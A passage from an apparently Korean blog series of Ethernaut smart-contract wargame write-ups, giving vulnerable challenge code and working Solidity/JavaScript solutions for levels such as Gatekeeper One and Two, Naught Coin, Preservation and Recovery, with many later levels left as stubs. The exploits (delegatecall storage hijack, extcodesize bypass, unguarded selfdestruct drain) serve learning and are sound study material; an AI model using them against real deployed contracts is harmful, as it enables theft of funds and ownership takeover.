정확한 gas는 컴파일러와 실행 경로에 따라 달라질 수 있으므로 공격 컨트랙트에서 `0`부터 `8190`까지 offset을 brute force한다.

`gateThree`는 `_gateKey`의 비트 조건을 맞추는 문제다.

```solidity
require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)));
require(uint32(uint64(_gateKey)) != uint64(_gateKey));
require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)));
```

조건을 만족하려면 다음 형태가 필요하다.

- 하위 16비트: `tx.origin`의 하위 16비트와 같아야 한다.
- 중간 16비트: `0`이어야 한다.
- 상위 32비트: `0`이 아니어야 한다.

그래서 `tx.origin`을 `uint64`로 줄인 뒤 `0xFFFFFFFF0000FFFF`로 마스킹한다.

### 공격 코드

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IGatekeeperOne {
    function enter(bytes8 _gateKey) external returns (bool);
}

contract GatekeeperOneAttack {
    IGatekeeperOne private immutable target;

    constructor(address targetAddress) {
        target = IGatekeeperOne(targetAddress);
    }

    function attack() external {
        uint64 key = uint64(uint160(tx.origin)) & 0xFFFFFFFF0000FFFF;

        for (uint256 i = 0; i < 8191; i++) {
            (bool success,) = address(target).call{gas: 8191 * 3 + i}(
                abi.encodeWithSignature("enter(bytes8)", bytes8(key))
            );

            if (success) {
                return;
            }
        }

        revert("gate failed");
    }
}
```

Remix에서 `GatekeeperOneAttack`을 배포할 때 `targetAddress`에는 Ethernaut 인스턴스 주소를 넣는다.

```javascript
contract.address
```

배포 후 `attack()`을 실행하고 확인한다.

```javascript
await contract.entrant()
```

내 지갑 주소가 나오면 인스턴스를 제출하면 된다.

### 정리

modifier도 결국 조건문이다. 호출 주체, gas, 타입 캐스팅 규칙을 각각 맞추면 우회할 수 있다. 

특히 작은 정수 타입으로 잘라 비교하는 로직은 비트 단위로 계산해야 한다.

</section>
<section class="ethernaut-page" data-ethernaut-page data-level-title="Gatekeeper Two" markdown="1">

## 14. Gatekeeper Two

### 문제 요약

세 개의 gate를 통과해 `entrant`를 내 주소로 만들면 클리어된다. 이번에는 생성자 실행 중인 컨트랙트의 code size가 0이라는 점과 XOR 연산을 이용한다.

### 핵심

- 생성자 실행 중 code size
- XOR 조건
- `extcodesize`

### 소스코드

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract GatekeeperTwo {
    address public entrant;

    modifier gateOne() {
        require(msg.sender != tx.origin);
        _;
    }

    modifier gateTwo() {
        uint256 x;
        assembly {
            x := extcodesize(caller())
        }
        require(x == 0);
        _;
    }

    modifier gateThree(bytes8 _gateKey) {
        require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == type(uint64).max);
        _;
    }

    function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
        entrant = tx.origin;
        return true;
    }
}
```

### 풀이

`gateOne`은 13번과 같다.

```solidity
require(msg.sender != tx.origin);
```

공격 컨트랙트가 대신 `enter()`를 호출하면 통과된다.

`gateTwo`는 호출자의 코드 크기를 검사한다.

```solidity
assembly {
    x := extcodesize(caller())
}
require(x == 0);
```

일반적으로 배포된 컨트랙트는 code size가 0보다 크다. 하지만 컨트랙트 생성자 실행 중에는 아직 런타임 코드가 저장되기 전이라 `extcodesize(address(this))`가 0이다.

따라서 공격 컨트랙트의 `constructor` 안에서 `enter()`를 호출해야 한다.

`gateThree`는 XOR 조건이다.

```solidity
uint64(bytes8(keccak256(abi.encodePacked(msg.sender))))
    ^ uint64(_gateKey)
    == type(uint64).max
```

XOR은 같은 값을 다시 XOR하면 원래 값을 되돌릴 수 있다. 그래서 필요한 키는 다음과 같다.

```solidity
key = bytes8(hash ^ type(uint64).max)
```

여기서 `msg.sender`는 공격 컨트랙트 주소이므로 생성자 안에서 `address(this)`로 계산한다.

### 공격 코드

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IGatekeeperTwo {
    function enter(bytes8 _gateKey) external returns (bool);
}

contract GatekeeperTwoAttack {
    constructor(address targetAddress) {
        uint64 hash = uint64(
            bytes8(keccak256(abi.encodePacked(address(this))))
        );
        bytes8 key = bytes8(hash ^ type(uint64).max);

        IGatekeeperTwo(targetAddress).enter(key);
    }
}
```

Remix에서 `GatekeeperTwoAttack`을 배포할 때 `targetAddress`에는 Ethernaut 인스턴스 주소를 넣는다.

```javascript
contract.address
```

배포가 성공하면 생성자 안에서 이미 공격이 끝난다. 확인:

```javascript
await contract.entrant()
```

내 지갑 주소가 나오면 인스턴스를 제출하면 된다.

### 정리

생성자 실행 중인 컨트랙트는 아직 코드가 저장되지 않아 `extcodesize`가 0으로 보인다. 

코드 크기만으로 EOA와 컨트랙트를 구분하는 방식은 안전하지 않다.

</section>
<section class="ethernaut-page" data-ethernaut-page data-level-title="Naught Coin" markdown="1">

## 15. Naught Coin

### 문제 요약

보유한 NaughtCoin 전량을 다른 주소로 옮기면 클리어된다. `transfer()`는 timelock에 막혀 있지만 ERC-20의 `approve()`와 `transferFrom()`은 막혀 있지 않다.

### 핵심

- ERC-20 allowance
- `transferFrom`
- 제한 함수 우회

### 소스코드

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "openzeppelin-contracts-08/token/ERC20/ERC20.sol";

contract NaughtCoin is ERC20 {
    // string public constant name = 'NaughtCoin';
    // string public constant symbol = '0x0';
    // uint public constant decimals = 18;
    uint256 public timeLock = block.timestamp + 10 * 365 days;
    uint256 public INITIAL_SUPPLY;
    address public player;

    constructor(address _player) ERC20("NaughtCoin", "0x0") {
        player = _player;
        INITIAL_SUPPLY = 1000000 * (10 ** uint256(decimals()));
        // _totalSupply = INITIAL_SUPPLY;
        // _balances[player] = INITIAL_SUPPLY;
        _mint(player, INITIAL_SUPPLY);
        emit Transfer(address(0), player, INITIAL_SUPPLY);
    }

    function transfer(address _to, uint256 _value) public override lockTokens returns (bool) {
        super.transfer(_to, _value);
    }

    // Prevent the initial owner from transferring tokens until the timelock has passed
    modifier lockTokens() {
        if (msg.sender == player) {
            require(block.timestamp > timeLock);
            _;
        } else {
            _;
        }
    }
}
```

### 풀이

초기 토큰은 생성자에서 `player`에게 전부 발행된다.

```solidity
player = _player;
INITIAL_SUPPLY = 1000000 * (10 ** uint256(decimals()));
_mint(player, INITIAL_SUPPLY);
```

이전 ERC-20 구현처럼 `_totalSupply`, `_balances`를 직접 만지는 코드는 주석 처리되어 있고, 현재 코드는 OpenZeppelin ERC-20의 `_mint()`를 사용한다.

전송 제한은 오버라이드한 `transfer()`에만 걸려 있다.

```solidity
function transfer(address _to, uint256 _value) public override lockTokens returns (bool) {
    return super.transfer(_to, _value);
}
```

`lockTokens`는 `msg.sender == player`일 때만 시간 제한을 검사한다.

```solidity
if (msg.sender == player) {
    require(block.timestamp > timeLock);
    _;
} else {
    _;
}
```

즉 `player`가 직접 `transfer()`를 호출하면 10년이 지나기 전까지 막힌다.

하지만 이 컨트랙트는 ERC-20을 상속한다. ERC-20에는 토큰 소유자가 spender에게 권한을 주는 `approve()`와, spender가 대신 토큰을 옮기는 `transferFrom()`이 있다.

중요한 점은 현재 소스 코드가 `transfer()`만 오버라이드했다는 것이다. `transferFrom()`은 오버라이드하지 않았고 `lockTokens`도 붙어 있지 않다.

그래서 다음 순서로 우회한다.

1. 내 주소가 내 토큰 전량을 사용할 수 있게 `approve(player, balance)`를 호출한다.
2. `transferFrom(player, recipient, balance)`로 전량을 다른 주소로 보낸다.

중요한 점은 `transfer()`를 호출하지 않는다는 것이다.

### 공격 코드

```javascript
const balance = await contract.balanceOf(player);
const recipient = "0x0000000000000000000000000000000000000001";

await contract.approve(player, balance);
await contract.transferFrom(player, recipient, balance);

await contract.balanceOf(player);
```

- `balanceOf(player)`: 옮길 전체 잔액을 확인한다.
- `approve(player, balance)`: 내 주소가 내 토큰을 대신 사용할 수 있게 허용한다.
- `transferFrom(player, recipient, balance)`: `transfer()`가 아니라 `transferFrom()`으로 전량 이동한다.
- 마지막 `balanceOf(player)`: `0`이면 성공이다.

### 정리

함수 하나에만 제한을 걸면 같은 효과를 내는 다른 경로로 우회할 수 있다. ERC-20에서는 `transfer()`뿐 아니라 `transferFrom()` 경로까지 함께 고려해야 한다.

</section>
<section class="ethernaut-page" data-ethernaut-page data-level-title="Preservation" markdown="1">

## 16. Preservation

### 문제 요약

`owner`를 내 주소로 바꾸면 클리어된다. `delegatecall` 때문에 라이브러리의 `storedTime` 변경이 실제로는 `Preservation`의 slot 0을 덮어쓴다.

### 핵심

- `delegatecall`
- 스토리지 슬롯 충돌
- 라이브러리 주소 변조

### 소스코드

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Preservation {
    // public library contracts
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;
    uint256 storedTime;
    // Sets the function signature for delegatecall
    bytes4 constant setTimeSignature = bytes4(keccak256("setTime(uint256)"));

    constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) {
        timeZone1Library = _timeZone1LibraryAddress;
        timeZone2Library = _timeZone2LibraryAddress;
        owner = msg.sender;
    }

    // set the time for timezone 1
    function setFirstTime(uint256 _timeStamp) public {
        timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
    }

    // set the time for timezone 2
    function setSecondTime(uint256 _timeStamp) public {
        timeZone2Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
    }
}

// Simple library contract to set the time
contract LibraryContract {
    // stores a timestamp
    uint256 storedTime;

    function setTime(uint256 _time) public {
        storedTime = _time;
    }
}
```

### 풀이

핵심은 `delegatecall`과 스토리지 레이아웃 차이다.

`Preservation`의 스토리지는 다음 순서다.

- slot 0: `timeZone1Library`
- slot 1: `timeZone2Library`
- slot 2: `owner`
- slot 3: `storedTime`

반면 `LibraryContract`는 변수 하나만 있다.

```solidity
uint256 storedTime;
```

즉 `LibraryContract` 기준 `storedTime`은 slot 0이다.

`setFirstTime()`은 `timeZone1Library`를 대상으로 `delegatecall`을 한다.

```solidity
timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
```

`delegatecall`은 대상 컨트랙트의 코드만 실행하고, 스토리지는 호출한 컨트랙트의 스토리지를 사용한다. 그래서 `LibraryContract.setTime()`의 다음 코드가 실행되면:

```solidity
storedTime = _time;
```

실제로는 `Preservation`의 slot 0, 즉 `timeZone1Library`가 `_time` 값으로 바뀐다.

공격 순서는 두 단계다.

1. `setFirstTime(uint256(uint160(공격컨트랙트주소)))`를 호출해 `timeZone1Library`를 공격 컨트랙트 주소로 바꾼다.
2. 다시 `setFirstTime(...)`을 호출하면 이제 공격 컨트랙트가 `delegatecall` 대상이 된다. 공격 컨트랙트의 `setTime()`에서 slot 2에 있는 `owner`를 바꾼다.

공격 컨트랙트는 `Preservation`과 같은 슬롯 배치를 맞춰야 한다.

### 공격 코드

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IPreservation {
    function setFirstTime(uint256 _timeStamp) external;
}

contract PreservationAttack {
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;

    IPreservation private immutable target;

    constructor(address targetAddress) {
        target = IPreservation(targetAddress);
    }

    function attack() external {
        target.setFirstTime(uint256(uint160(address(this))));
        target.setFirstTime(uint256(uint160(msg.sender)));
    }

    function setTime(uint256 _owner) public {
        owner = address(uint160(_owner));
    }
}
```

Remix에서 `PreservationAttack`을 배포할 때 `targetAddress`에는 Ethernaut 인스턴스 주소를 넣는다.

```javascript
contract.address
```

배포 후 `attack()`을 실행하고 확인한다.

```javascript
await contract.owner()
```

내 지갑 주소가 나오면 인스턴스를 제출하면 된다.

### 정리

`delegatecall`을 사용할 때는 호출 대상 코드와 현재 컨트랙트의 스토리지 레이아웃이 맞아야 한다. 

라이브러리 주소를 외부 입력으로 덮을 수 있으면, 이후 임의 코드 실행으로 소유권까지 탈취할 수 있다.

</section>
<section class="ethernaut-page" data-ethernaut-page data-level-title="Recovery" markdown="1">

## 17. Recovery

### 문제 요약

생성된 `SimpleToken` 컨트랙트 주소를 찾아서 남아 있는 ETH를 회수하면 클리어된다. 문제는 토큰 컨트랙트 주소를 잃어버렸지만, 컨트랙트 생성 주소는 계산할 수 있다는 점이다.

### 핵심

- 컨트랙트 주소 계산
- nonce
- 잃어버린 인스턴스 복구

### 소스코드

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Recovery {
    //generate tokens
    function generateToken(string memory _name, uint256 _initialSupply) public {
        new SimpleToken(_name, msg.sender, _initialSupply);
    }
}

contract SimpleToken {
    string public name;
    mapping(address => uint256) public balances;

    // constructor
    constructor(string memory _name, address _creator, uint256 _initialSupply) {
        name = _name;
        balances[_creator] = _initialSupply;
    }

    // collect ether in return for tokens
    receive() external payable {
        balances[msg.sender] = msg.value * 10;
    }

    // allow transfers of tokens
    function transfer(address _to, uint256 _amount) public {
        require(balances[msg.sender] >= _amount);
        balances[msg.sender] = balances[msg.sender] - _amount;
        balances[_to] = _amount;
    }

    // clean up after ourselves
    function destroy(address payable _to) public {
        selfdestruct(_to);
    }
}
```

### 풀이

`Recovery.generateToken()`은 `new SimpleToken(...)`으로 토큰 컨트랙트를 만든다.

```solidity
new SimpleToken(_name, msg.sender, _initialSupply);
```

Ethereum에서 `CREATE`로 만들어지는 컨트랙트 주소는 랜덤이 아니다. 생성자 주소와 nonce로 결정된다.

```text
address = last20bytes(keccak256(rlp([creator, nonce])))
```

여기서 creator는 `Recovery` 인스턴스 주소다. Ethernaut 인스턴스에서 `generateToken()`으로 `SimpleToken`을 한 번 만들었으므로 보통 nonce는 `1`이다.

즉 `Recovery` 인스턴스 주소와 nonce `1`로 `SimpleToken` 주소를 계산할 수 있다.
주소를 찾은 뒤에는 `SimpleToken.destroy()`를 호출하면 된다.

```solidity
function destroy(address payable _to) public {
    selfdestruct(_to);
}
```

`destroy()`에는 접근 제어가 없다. 누구나 호출 가능하다. `_to`에는 내 지갑 주소를 넣어 SimpleToken에 남은 ETH를 회수한다.

### 공격 코드

```javascript
const recoveryAddress = contract.address;
const nonce = 1;

const tokenAddress = web3.utils.toChecksumAddress(
  "0x" + web3.utils
    .sha3(`0xd694${recoveryAddress.slice(2)}0${nonce}`)
    .slice(-40)
);

const token = await new web3.eth.Contract([
  {
    inputs: [{ name: "_to", type: "address" }],
    name: "destroy",
    outputs: [],
    stateMutability: "nonpayable",
    type: "function"
  }
], tokenAddress);

await token.methods.destroy(player).send({ from: player });
```

주소만 따로 확인하려면:

```javascript
tokenAddress
```

`SimpleToken` 잔액 확인:

```javascript
await getBalance(tokenAddress)
```

`destroy()` 호출 후 잔액이 `0`이면 인스턴스를 제출하면 된다.

### 정리

컨트랙트 주소는 숨겨진 값이 아니다. `CREATE`로 배포된 컨트랙트 주소는 생성자 주소와 nonce로 계산할 수 있다.
주소를 찾은 뒤 접근 제어가 없는 `destroy()`를 호출하면 ETH를 회수할 수 있다.

</section>
<section class="ethernaut-page" data-ethernaut-page data-level-title="MagicNumber" markdown="1">

## 18. MagicNumber

### 문제 요약

`whatIsTheMeaningOfLife()`를 호출했을 때 `42`를 반환하는 solver 컨트랙트를 등록하면 클리어된다. 단, solver의 런타임 코드는 매우 작게 만들어야 한다.

### 핵심

- EVM bytecode
- 런타임 코드
- 최소 컨트랙트

### 소스코드

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract MagicNum {
    address public solver;

    constructor() {}

    function setSolver(address _solver) public {
        solver = _solver;
    }

    /*
    ____________/\\\_______/\\\\\\\\\_____        
     __________/\\\\\_____/\\\///////\\\___       
      ________/\\\/\\\____\///______\//\\\__      
       ______/\\\/\/\\\______________/\\\/___     
        ____/\\\/__\/\\\___________/\\\//_____    
         __/\\\\\\\\\\\\\\\\_____/\\\//________   
          _\///////////\\\//____/\\\/___________  
           ___________\/\\\_____/\\\\\\\\\\\\\\\_ 
            ___________\///_____\///////////////__
    */
}
```

### 풀이

이 문제는 Solidity 코드로 일반 컨트랙트를 작성하는 방식보다 EVM bytecode를 직접 만드는 방식이 맞다.

목표는 solver 주소에 있는 컨트랙트가 다음 호출에 대해 `42`를 반환하게 만드는 것이다.

```solidity
whatIsTheMeaningOfLife()
```

함수 selector 검사는 없다. 어떤 calldata가 오든 32바이트 값 `42`를 반환하면 된다.

런타임 코드는 다음 동작만 하면 된다.

1. 메모리 `0x00` 위치에 `0x2a`를 저장한다.
2. 메모리 `0x00`부터 32바이트를 반환한다.

EVM opcode로 쓰면 다음과 같다.

```text
602a60005260206000f3
```

분해하면:

- `60 2a`: `PUSH1 0x2a`
- `60 00`: `PUSH1 0x00`
- `52`: `MSTORE`
- `60 20`: `PUSH1 0x20`
- `60 00`: `PUSH1 0x00`
- `f3`: `RETURN`

이건 런타임 코드다. 배포할 때는 이 런타임 코드를 체인에 저장하는 creation code가 필요하다.

```text
600a600c600039600a6000f3
```

전체 배포 바이트코드는 creation code와 runtime code를 이어 붙인 값이다.

### 공격 코드

```javascript
const bytecode = "0x600a600c600039600a6000f3602a60005260206000f3";

const receipt = await web3.eth.sendTransaction({
  from: player,
  data: bytecode
});

await contract.setSolver(receipt.contractAddress);
```

solver 주소 확인:

```javascript
await contract.solver()
```

등록된 solver가 실제로 `42`를 반환하는지 확인하려면 직접 call을 날린다.

```javascript
await web3.eth.call({
  to: await contract.solver(),
  data: web3.eth.abi.encodeFunctionSignature("whatIsTheMeaningOfLife()")
})
```

반환값 끝이 `2a`면 `42`다.

### 정리

EVM 컨트랙트는 Solidity 없이도 bytecode만으로 배포할 수 있다. 이 문제의 solver는 어떤 calldata가 와도 메모리에 `42`를 쓰고 32바이트로 반환하는 최소 런타임 코드면 충분하다.

</section>
<section class="ethernaut-page" data-ethernaut-page data-level-title="Alien Codex" markdown="1">

## 19. Alien Codex

### 문제 요약

작성 예정.

### 핵심

- 배열 길이 언더플로우
- 스토리지 슬롯 계산
- owner 슬롯 덮어쓰기

### 소스코드

```solidity
// 작성 예정
```

### 풀이

작성 예정.

### 공격 코드

```javascript
// 작성 예정
```

### 정리

작성 예정.

</section>
<section class="ethernaut-page" data-ethernaut-page data-level-title="Denial" markdown="1">

## 20. Denial

### 문제 요약

작성 예정.

### 핵심

- gas griefing
- 외부 호출 실패
- 서비스 거부

### 소스코드

```solidity
// 작성 예정
```

### 풀이

작성 예정.

### 공격 코드

```solidity
// 작성 예정
```

### 정리

작성 예정.

</section>
<section class="ethernaut-page" data-ethernaut-page data-level-title="Shop" markdown="1">

## 21. Shop

### 문제 요약

작성 예정.

### 핵심

- view 함수 신뢰 문제
- 상태 기반 가격 조작
- 인터페이스 응답 변경

### 소스코드

```solidity
// 작성 예정
```

### 풀이

작성 예정.

### 공격 코드

```solidity
// 작성 예정
```

### 정리

작성 예정.

</section>
<section class="ethernaut-page" data-ethernaut-page data-level-title="Dex" markdown="1">

## 22. Dex

### 문제 요약

작성 예정.

### 핵심

- AMM 가격 계산
- 유동성 고갈
- 슬리피지 검증 부재

### 소스코드

```solidity
// 작성 예정
```

### 풀이

작성 예정.

### 공격 코드

```javascript
// 작성 예정
```

### 정리

작성 예정.

</section>
<section class="ethernaut-page" data-ethernaut-page data-level-title="Dex Two" markdown="1">

## 23. Dex Two

### 문제 요약

작성 예정.

### 핵심

- 토큰 주소 검증 부재
- 가짜 토큰
- 비정상 교환 경로

### 소스코드

```solidity
// 작성 예정
```

### 풀이

작성 예정.

### 공격 코드

```solidity
// 작성 예정
```

### 정리

작성 예정.

</section>
<section class="ethernaut-page" data-ethernaut-page data-level-title="Puzzle Wallet" markdown="1">

## 24. Puzzle Wallet

### 문제 요약

작성 예정.

### 핵심

- proxy storage collision
- multicall
- 잔액 중복 반영

### 소스코드

```solidity
// 작성 예정
```

### 풀이

작성 예정.

### 공격 코드

```javascript
// 작성 예정
```

### 정리

작성 예정.

</section>
<section class="ethernaut-page" data-ethernaut-page data-level-title="Motorbike" markdown="1">

## 25. Motorbike

### 문제 요약

작성 예정.

### 핵심

- UUPS proxy
- 초기화 누락
- implementation 파괴

### 소스코드

```solidity
// 작성 예정
```

### 풀이

작성 예정.

### 공격 코드

```solidity
// 작성 예정
```

### 정리

작성 예정.

</section>
<section class="ethernaut-page" data-ethernaut-page data-level-title="DoubleEntryPoint" markdown="1">

## 26. DoubleEntryPoint

### 문제 요약

작성 예정.

### 핵심

- delegate token
- Forta bot
- 탐지 로직 작성

### 소스코드

```solidity
// 작성 예정
```

### 풀이

작성 예정.

### 공격 코드

```solidity
// 작성 예정
```

### 정리

작성 예정.

</section>
<section class="ethernaut-page" data-ethernaut-page data-level-title="Good Samaritan" markdown="1">

## 27. Good Samaritan

### 문제 요약

작성 예정.

### 핵심

- custom error
- 예외 기반 분기
- 악성 receiver

### 소스코드

```solidity
// 작성 예정
```

### 풀이

작성 예정.

### 공격 코드

```solidity
// 작성 예정
```

### 정리

작성 예정.

</section>
<section class="ethernaut-page" data-ethernaut-page data-level-title="Gatekeeper Three" markdown="1">

## 28. Gatekeeper Three

### 문제 요약

작성 예정.

### 핵심

- constructor 착각
- owner 조건
- ETH 전송 실패 유도

### 소스코드

```solidity
// 작성 예정
```

### 풀이

작성 예정.

### 공격 코드

```solidity
// 작성 예정
```

### 정리

작성 예정.

</section>
<section class="ethernaut-page" data-ethernaut-page data-level-title="Switch" markdown="1">

## 29. Switch

### 문제 요약

작성 예정.

### 핵심

- calldata 인코딩
- offset 조작
- selector 검증 우회

### 소스코드

```solidity
// 작성 예정
```

### 풀이

작성 예정.

### 공격 코드

```javascript
// 작성 예정
```

### 정리

작성 예정.

</section>
<section class="ethernaut-page" data-ethernaut-page data-level-title="HigherOrder" markdown="1">

## 30. HigherOrder

### 문제 요약

작성 예정.

### 핵심

- ABI 타입 검증 차이
- calldata 직접 구성
- 짧은 타입 우회

### 소스코드

```solidity
// 작성 예정
```

### 풀이

작성 예정.

### 공격 코드

```javascript
// 작성 예정
```

### 정리

작성 예정.

</section>
<section class="ethernaut-page" data-ethernaut-page data-level-title="Stake" markdown="1">

## 31. Stake

### 문제 요약

작성 예정.

### 핵심

- WETH 흐름
- 상태 불일치
- staking 조건 검증

### 소스코드

```solidity
// 작성 예정
```

### 풀이

작성 예정.

### 공격 코드

```javascript
// 작성 예정
```

### 정리

작성 예정.

</section>
<section class="ethernaut-page" data-ethernaut-page data-level-title="Impersonator" markdown="1">

## 32. Impersonator

### 문제 요약

작성 예정.

### 핵심

- 서명 검증
- ECDSA
- 신원 위장

### 소스코드

```solidity
// 작성 예정
```

### 풀이

작성 예정.

### 공격 코드

```javascript
// 작성 예정
```

### 정리

작성 예정.

</section>
<section class="ethernaut-page" data-ethernaut-page data-level-title="Magic Animal Carousel" markdown="1">

## 33. Magic Animal Carousel

### 문제 요약

작성 예정.

### 핵심

- 작성 예정

### 소스코드

```solidity
// 작성 예정
```

### 풀이

작성 예정.

### 공격 코드

```javascript
// 작성 예정
```

### 정리

작성 예정.

</section>
<section class="ethernaut-page" data-ethernaut-page data-level-title="Bet House" markdown="1">

## 34. Bet House

### 문제 요약

작성 예정.

### 핵심

- 작성 예정

### 소스코드

```solidity
// 작성 예정
```

### 풀이

작성 예정.

### 공격 코드

```javascript
// 작성 예정
```

### 정리

작성 예정.

</section>
<section class="ethernaut-page" data-ethernaut-page data-level-title="Elliptic Token" markdown="1">

## 35. Elliptic Token

### 문제 요약

작성 예정.

### 핵심

- 작성 예정

### 소스코드

```solidity
// 작성 예정
```

### 풀이

작성 예정.

### 공격 코드

```javascript
// 작성 예정
```

### 정리

작성 예정.

</section>
<section class="ethernaut-page" data-ethernaut-page data-level-title="Cashback" markdown="1">

## 36. Cashback

### 문제 요약

작성 예정.

### 핵심

- 작성 예정

### 소스코드

```solidity
// 작성 예정
```

### 풀이

작성 예정.

### 공격 코드

```javascript
// 작성 예정
```

### 정리

작성 예정.

</section>
<section class="ethernaut-page" data-ethernaut-page data-level-title="Impersonator Two" markdown="1">

## 37. Impersonator Two

### 문제 요약

작성 예정.

### 핵심

- 작성 예정

### 소스코드

```solidity
// 작성 예정
```

### 풀이

작성 예정.

### 공격 코드

```javascript
// 작성 예정
```

### 정리

작성 예정.

</section>
<section class="ethernaut-page" data-ethernaut-page data-level-title="UniqueNFT" markdown="1">

## 38. UniqueNFT

### 문제 요약

작성 예정.

### 핵심

- 작성 예정

### 소스코드

```solidity
// 작성 예정
```

### 풀이

작성 예정.

### 공격 코드

```javascript
// 작성 예정
```

### 정리

작성 예정.

</section>
<section class="ethernaut-page" data-ethernaut-page data-level-title="Forger" markdown="1">

## 39. Forger

### 문제 요약

작성 예정.

### 핵심

- 작성 예정

### 소스코드

```solidity
// 작성 예정
```

### 풀이

작성 예정.

### 공격 코드

```javascript
// 작성 예정
```

### 정리

작성 예정.

</section>
<section class="ethernaut-page" data-ethernaut-page data-level-title="NotOptimisticPortal" markdown="1">

## 40. NotOptimisticPortal

### 문제 요약

작성 예정.

### 핵심

- 작성 예정

### 소스코드

```solidity
// 작성 예정
```

### 풀이

작성 예정.

### 공격 코드

```javascript
// 작성 예정
```

### 정리

작성 예정.

</section>

  <div class="ethernaut-pager__bottom">
    <button type="button" class="ethernaut-pager__button" data-ethernaut-prev>이전</button>
    <button type="button" class="ethernaut-pager__button" data-ethernaut-next>다음</button>
  </div>
</div>

<style>
  .ethernaut-pager {
    display: grid;
    gap: 1.25rem;
  }

  .post-toc {
    display: none !important;
  }

  .ethernaut-pager__top,
  .ethernaut-pager__bottom {
    display: flex;
    align-items: center;
    gap: 0.75rem;
    padding: 0.85rem;
    border: 1px solid rgba(42, 91, 138, 0.16);
    border-radius: 8px;
    background: rgba(238, 246, 252, 0.74);
  }

  .ethernaut-pager__top {
    justify-content: center;
  }

  .ethernaut-pager__bottom {
    justify-content: space-between;
  }

  .ethernaut-pager__status {
    color: #163a5f;
    font-size: 0.95rem;
    font-weight: 800;
    text-align: center;
  }

  .ethernaut-pager__button,
  .ethernaut-pager__tabs button {
    min-height: 40px;
    border: 1px solid rgba(42, 91, 138, 0.2);
    border-radius: 8px;
    background: #fbfdff;
    color: #163a5f;
    cursor: pointer;
    font: inherit;
    font-weight: 800;
    transition: background 0.18s ease, border-color 0.18s ease, transform 0.18s ease;
  }

  .ethernaut-pager__button {
    padding: 0 1rem;
  }

  .ethernaut-pager__tabs {
    display: grid;
    grid-template-columns: repeat(auto-fit, minmax(42px, 1fr));
    gap: 0.45rem;
  }

  .ethernaut-pager__tabs button {
    padding: 0;
  }

  .ethernaut-pager__button:hover,
  .ethernaut-pager__tabs button:hover,
  .ethernaut-pager__button:focus-visible,
  .ethernaut-pager__tabs button:focus-visible {
    border-color: rgba(45, 129, 198, 0.58);
    background: #eef6fc;
    transform: translateY(-1px);
  }

  .ethernaut-pager__button:disabled {
    cursor: not-allowed;
    opacity: 0.45;
    transform: none;
  }

  .ethernaut-pager__tabs button.is-active {
    background: #163a5f;
    color: #f7fbff;
    border-color: #163a5f;
  }

  .ethernaut-page[hidden] {
    display: none;
  }

  body.dark-mode .ethernaut-pager__top,
  body.dark-mode .ethernaut-pager__bottom {
    border-color: rgba(132, 181, 223, 0.2);
    background: rgba(15, 25, 36, 0.78);
  }

  body.dark-mode .ethernaut-pager__status {
    color: #d8ecff;
  }

  body.dark-mode .ethernaut-pager__button,
  body.dark-mode .ethernaut-pager__tabs button {
    border-color: rgba(132, 181, 223, 0.22);
    background: rgba(12, 21, 31, 0.94);
    color: #d8ecff;
  }

  body.dark-mode .ethernaut-pager__tabs button.is-active {
    background: #74b9ef;
    color: #06111d;
    border-color: #74b9ef;
  }

  @media (max-width: 640px) {
    .ethernaut-pager__tabs {
      grid-template-columns: repeat(5, minmax(0, 1fr));
    }
  }
</style>

<script>
  (() => {
    const pager = document.querySelector('[data-ethernaut-pager]');

    if (!pager) {
      return;
    }

    const pages = Array.from(pager.querySelectorAll('[data-ethernaut-page]'));
    const tabsContainer = pager.querySelector('[data-ethernaut-tabs]');
    const status = pager.querySelector('[data-ethernaut-status]');
    const prevButtons = Array.from(pager.querySelectorAll('[data-ethernaut-prev]'));
    const nextButtons = Array.from(pager.querySelectorAll('[data-ethernaut-next]'));
    const initialLevel = Number(new URLSearchParams(window.location.search).get('level'));
    let currentIndex = Number.isInteger(initialLevel) ? initialLevel : 0;

    const maxIndex = pages.length - 1;
    const clampIndex = (index) => Math.min(Math.max(index, 0), maxIndex);

    const createTabs = () => {
      pages.forEach((page, index) => {
        const tab = document.createElement('button');
        tab.type = 'button';
        tab.dataset.ethernautTab = String(index);
        tab.textContent = String(index);
        tab.title = page.dataset.levelTitle || 'Level ' + index;
        tab.setAttribute('aria-label', 'Ethernaut ' + index + ': ' + tab.title);
        tab.addEventListener('click', () => showPage(index, true));
        tabsContainer.appendChild(tab);
      });
    };

    const getTabs = () => Array.from(pager.querySelectorAll('[data-ethernaut-tab]'));

    const showPage = (index, shouldScroll = false) => {
      currentIndex = clampIndex(index);

      pages.forEach((page, pageIndex) => {
        page.hidden = pageIndex !== currentIndex;
      });

      getTabs().forEach((tab) => {
        const isActive = Number(tab.dataset.ethernautTab) === currentIndex;
        tab.classList.toggle('is-active', isActive);
        tab.setAttribute('aria-current', isActive ? 'page' : 'false');
      });

      prevButtons.forEach((button) => {
        button.disabled = currentIndex === 0;
      });

      nextButtons.forEach((button) => {
        button.disabled = currentIndex === maxIndex;
      });

      if (status) {
        status.textContent = 'Ethernaut ' + currentIndex + ' / ' + maxIndex + ' - ' + (pages[currentIndex].dataset.levelTitle || '');
      }

      const url = new URL(window.location.href);
      url.searchParams.set('level', currentIndex);
      window.history.replaceState(null, '', url);

      if (shouldScroll) {
        pager.scrollIntoView({ behavior: 'smooth', block: 'start' });
      }
    };

    prevButtons.forEach((button) => {
